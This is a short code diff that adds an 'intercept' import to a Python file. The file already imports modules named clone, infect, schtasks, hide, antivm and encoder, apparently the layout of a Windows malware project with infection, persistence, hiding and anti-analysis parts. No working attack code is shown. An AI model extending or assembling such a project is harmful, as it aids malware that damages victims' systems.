@@ -27,6 +27,7 @@ import win32console
 from clone import *
 from infect import *
 from schtasks import *
+from intercept import *
 from hide import *
 from antivm import *
 from encoder import *
